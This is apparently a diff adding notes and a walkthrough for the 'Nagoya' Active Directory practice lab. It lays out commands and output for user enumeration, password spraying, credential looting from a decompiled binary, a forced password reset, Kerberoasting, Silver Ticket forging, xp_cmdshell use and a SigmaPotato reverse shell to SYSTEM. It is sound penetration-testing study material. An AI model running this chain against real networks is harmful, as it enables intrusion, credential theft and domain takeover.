@@ -1,0 +1,182 @@
+nmap found it is a DC.
+
+80/tcp    open  http              Microsoft IIS httpd 10.0
+|_http-title: Nagoya Industries - Nagoya
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-04-16 01:34:56Z)
+3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
+5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+
+
+cewl -m 4 -d 2 http://192.168.204.21/Team  > names.txt
+or just copy paste users name in /Team to txt file. 
+username-anarchy -i names.txt -f first,flast,first.last,firstl > users.txt
+
+User Enumeration: kerbrute userenum -d nagoya-industries.com users.txt --dc 192.168.204.21
+
+2026/04/16 12:53:21 >  [+] VALID USERNAME:       matthew.harrison@nagoya-industries.com
+cat validusers.txt | awk '{print $7}'| cut -d "@" -f 1 > domUsers.txt
+# this line make above output become below domain username.
+matthew.harrison
+guessing password pattern, generate password list.
+for i in $(cat trypass.txt); do echo $i; echo ${i}2022; echo ${i}2023; echo ${i}\! ;done > pass.txt
+
+$ nxc smb 192.168.204.21 -u domUsers.txt -p pass.txt --continue-on-success | grep "+"
+SMB                      192.168.204.21  445    NAGOYA           [+] nagoya-industries.com\craig.carr:Spring2023 
+SMB                      192.168.204.21  445    NAGOYA           [+] nagoya-industries.com\fiona.clark:Summer2023
+smbclient -L 
+found the NETLOGON share and found one .exe file named ResetPassword.exe
+use ILSpy to decompile and get below creds, can also use dotpeek.
+
+service_username = "svc_helpdesk";
+service_Password = "U299iYRmikYTHDbPbxPoYYfa2j4x4cdg";
+
+User bloodhound to find this user in Remote Management Group and svc_helpdesk have GenericAll right over him.
+
+$ net rpc password "Christopher.Lewis" "Pumpkin2025" -U "nagoya-industries.com/svc_helpdesk"%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S "192.168.204.21"
+
+$ evil-winrm -i 192.168.204.21 -u 'Christopher.Lewis' -p 'Pumpkin2025'
+
+impacket-GetUserSPNs nagoya-industries.com/svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg -dc-ip 192.168.204.21 -request
+found hash for svc_mssql
+hashcat --identify '$krb5tgs$23$*svc_mssql$NAGOYA-INDUSTRIES.COM$nagoya-industries.com/svc_mssql*
+13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
+cracked with hashcat -m 13100 rockyou.txt
+Service1
+
+set up ligolo-ng.
+impacket-mssqlclient svc_mssql:'Service1'@240.0.0.1 -windows-auth -p 1433
+
+# After connecting to the SQL Server as svc_mssql, we quickly hit a familiar roadblock: minimal privileges.
+Only the default databases were visible, and critical features like xp_cmdshell were restricted.
+# The hard part: when have valid credentials and Kerberos authentication, we can perform a Silver Ticket attack.
+This allows us to impersonate another user (like Administrator) and access the SQL Server without needing to talk to 
+the KDC.
+
+Evil-WinRM* PS C:\> Get-addomain
+DomainSID                          : S-1-5-21-1969309164-1513403977-1686805993
+
+To get the Service Principal Name (SPN) of the SQL Server account
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object Name,ServicePrincipalName
+Name         ServicePrincipalName
+----         --------------------
+svc_helpdesk {http/nagoya.nagoya-industries.com}
+krbtgt       {kadmin/changepw}
+svc_mssql    {MSSQL/nagoya.nagoya-industries.com}
+
+NThash can use the password Service1 to generate via online tool, Then run
+impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
+# This will generate a .ccache file that we can use to authenticate as Administrator to the SQL Server
+Export the variable, you can use klist to check if you ticket cache directory added
+then in Kali: export KRB5CCNAME=$PWD/Administrator.ccache
+Add this to /etc/hosts : 240.0.0.1 nagoya.nagoya-industries.com
+impacket-mssqlclient -k nagoya.nagoya-industries.com
+mssql>enable_xp_cmdshell
+mssql>xp_cmdshell "whoami /priv"
+found : SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+
+*Evil-WinRM* PS C:\Temp> upload SigmaPotato.exe Sigmapotato.exe
+
+mssql>xp_cmdshell "C:\Temp\SigmaPotato.exe --revshell 192.168.45.217 4444"
+
+$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.217] from (UNKNOWN) [192.168.204.21] 49849
+PS C:\Windows\system32> whoami
+nt authority\system
+
+##############################################################################################################
+refer: https://medium.com/@desp0/tj-nulls-oscp-pick-nagoya-lab-walkthrough-offsec-proving-grounds-guide-b15412c92987
+
+Walkthrough: Nagoya (Active Directory Lab)
+I. Enumeration & Foothold
+1. Services Scan
+Nmap reveals a Windows Domain Controller (DC) with Kerberos (88), SMB (445), WinRM (5985), and a Web Server (80).
+
+2. Username Harvesting
+Scrape the /Team page for names and use username-anarchy to generate common AD patterns (e.g., first.last).
+
+Bash
+cewl -m 4 -d 2 http://192.168.204.21/Team > names.txt
+username-anarchy -i names.txt -f first.last > users.txt
+3. User Validation & Password Spray
+Validate users via Kerberos and perform an SMB password spray using common seasonal patterns (e.g., Spring2023).
+
+Bash
+# Validate users
+kerbrute userenum -d nagoya-industries.com users.txt --dc 192.168.204.21
+
+# Spray passwords
+nxc smb 192.168.204.21 -u valid_users.txt -p pass.txt --continue-on-success
+Credentials Found: fiona.clark:Summer2023
+
+II. Lateral Movement (User to Service Account)
+1. SMB Looting & Decompilation
+Explore the NETLOGON share. Found ResetPassword.exe.
+Since it is a .NET assembly, use ILSpy or dnSpy to read the source code.
+
+Looted: svc_helpdesk : U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
+
+2. BloodHound Analysis & DACL Abuse
+BloodHound reveals that svc_helpdesk has GenericAll rights over Christopher.Lewis, and Christopher is in the Remote Management Users group (WinRM access).
+
+Action: Force a password reset for Christopher using the net rpc tool.
+
+Bash
+net rpc password "Christopher.Lewis" "Pumpkin2025" -U "nagoya-industries.com/svc_helpdesk"%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S 192.168.204.21
+3. Foothold via WinRM
+Login as Christopher to claim the user flag.
+
+Bash
+evil-winrm -i 192.168.204.21 -u 'Christopher.Lewis' -p 'Pumpkin2025'
+III. Kerberos Attacks (The Silver Ticket)
+1. Kerberoasting
+Request a Service Ticket for the SQL service account.
+
+Bash
+impacket-GetUserSPNs nagoya-industries.com/svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg -dc-ip 192.168.204.21 -request
+Crack Hash: hashcat -m 13100 hash.txt rockyou.txt
+
+Result: svc_mssql : Service1
+
+2. Forging the Silver Ticket
+To bypass SQL restrictions, forge a Silver Ticket to impersonate the Administrator for the MSSQL service.
+
+Get Domain SID: Get-ADDomain
+
+Get MSSQL SPN: MSSQL/nagoya.nagoya-industries.com
+
+Forge Ticket:
+
+Bash
+impacket-ticketer -nthash <NTLM_OF_SERVICE1> -domain-sid <SID> -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
+3. MSSQL Exploitation
+Inject the forged ticket into your session and connect using Kerberos authentication.
+
+Bash
+export KRB5CCNAME=$PWD/Administrator.ccache
+impacket-mssqlclient -k nagoya.nagoya-industries.com
+IV. Privilege Escalation to SYSTEM
+1. Token Impersonation
+Inside the MSSQL shell, enable xp_cmdshell and check privileges.
+
+SQL
+enable_xp_cmdshell
+xp_cmdshell "whoami /priv"
+Finding: SeImpersonatePrivilege is Enabled.
+
+2. SigmaPotato
+Upload SigmaPotato.exe via Evil-WinRM and trigger a reverse shell through the MSSQL xp_cmdshell to escalate to NT AUTHORITY\SYSTEM.
+
+SQL
+xp_cmdshell "C:\Temp\SigmaPotato.exe --revshell <KALI_IP> 4444"
+V. Key Lessons Learned
+Ghidra vs. ILSpy: Always check file output. .NET files require ILSpy/dnSpy.
+
+DACLs: GenericAll means you own the object. net rpc is the easiest way to reset passwords from Kali.
+
+Silver Tickets: Useful when you have the service account hash but want to access that specific service as a higher-privilege user (Administrator).
+
+The Potato Rule: SeImpersonatePrivilege + any Potato exploit = Root/System.
+
+
